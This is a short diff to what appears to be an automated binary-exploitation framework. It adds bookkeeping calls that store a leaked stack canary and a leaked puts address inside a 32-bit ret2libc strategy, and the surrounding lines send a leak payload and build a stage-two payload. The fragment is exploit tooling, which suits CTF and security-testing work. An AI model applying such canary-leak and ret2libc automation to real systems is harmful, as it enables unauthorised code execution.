@@ -140,6 +140,11 @@ class CanaryRet2LibcPutX32LocalStrategy(CanaryStrategy):
             io.sendline(plan.leak_payload)
             leak_line = io.recvline(timeout=2) or b""
             canary_value = _parse_plan_canary(leak_line, plan)
+            ctx.set_runtime_fact(
+                "canary.live_value",
+                canary_value,
+                source="strategy.canary_ret2libc_put.same_session",
+            )
             print_success(
                 f"same-session canary leaked: 0x{canary_value:x} "
                 f"(stack index {plan.stack_index})"
@@ -164,6 +169,11 @@ class CanaryRet2LibcPutX32LocalStrategy(CanaryStrategy):
                 print_info("canary-ret2libc-put-x32 same-session leak parse failed: short leak blob")
                 return False
             puts_addr = u32(leak_blob[:4])
+            ctx.set_runtime_fact(
+                "libc.puts_addr",
+                puts_addr,
+                source="strategy.canary_ret2libc_put.same_session",
+            )
             print_success(f"puts address leaked: {hex(puts_addr)}")
 
             payload2 = primitive.build_stage2_payload(ctx, puts_addr)
